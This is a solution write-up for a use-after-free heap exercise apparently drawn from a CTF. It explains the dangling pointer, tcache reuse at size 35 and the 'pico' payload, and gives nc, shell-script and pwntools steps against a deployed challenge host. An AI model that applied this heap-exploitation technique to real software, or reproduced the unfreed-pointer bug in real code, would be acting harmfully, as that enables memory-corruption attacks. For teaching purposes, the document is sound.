# Exercise: Use-After-Free (heap-3) — Solution

**Tools:** nc, GDB, pwntools

This is the solving write-up, for a challenge that is already deployed.
How the challenge is built and deployed is in [`README.chall.md`](README.chall.md).

## Goal

There is no overflow here.
Free the object `x`, get the same chunk back from the allocator, and write `"pico"` into its `flag` field through the pointer the program never cleared.

## The bug

The global object and its win condition:

```c
struct object {
        char a[10];
        char b[10];
        char c[10];
        char flag[5];
};

static struct object *x;
```

`check_win()` prints the flag as soon as `x->flag` reads `"pico"`; it starts as `"bico"`.
`free_memory()` frees `x` but never clears it:

```c
static void free_memory(void) { free(x); }   /* x is never set to NULL */
```

Every other option keeps dereferencing `x` — a textbook use-after-free.
`alloc_object()` then lets you allocate a chunk of a chosen size and write a chosen string into it.
The returned pointer is thrown away, but that does not matter: if the request lands in the same tcache bin as the just-freed object, glibc returns the identical chunk `x` still points to, so the write goes through `x`.

## Why size 35

glibc's tcache is a per-size-class free list.
A `free()` pushes the chunk onto its bin, and the next `malloc()` of that same size pops it straight back.
So the reclaim only works if you ask for the object's own size: `sizeof(struct object)` is `10 + 10 + 10 + 5 = 35` bytes.

## The write

The filler fields `a`/`b`/`c` push `flag` to offset 30 in the struct.
So fill 30 bytes, then `"pico"`, and the last field lines up exactly:

```text
"A"*10 + "B"*10 + "C"*10 + "pico"
```

## Solving it

All three forms do the same thing: free (option 5), allocate size 35 with that payload (option 2), check the win (option 4).

### By hand, over nc

```console
nc 141.85.224.106 31013
```

1. Choose `5` (Free x).
1. Choose `2` (Allocate object), enter size `35`, then enter the data `AAAAAAAAAABBBBBBBBBBCCCCCCCCCCpico`.
1. Choose `4` (Check for win).

### Shell script

`solve/solve.sh` sends those choices with `printf`:

```console
./solve.sh                      # against a local ./chall (uses the placeholder flag.txt)
./solve.sh 141.85.224.106 31013 # against the deployed service
```

### pwntools

`solve/exploit.py` does the same in Python:

```console
python3 exploit.py                                   # local ./chall
python3 exploit.py REMOTE HOST=141.85.224.106 PORT=31013
```

## References

* `man 3 free` — clearing the pointer (`x = NULL`) is the fix, and `free(NULL)` is safe
* [glibc malloc internals (tcache)](https://sourceware.org/glibc/wiki/MallocInternals)
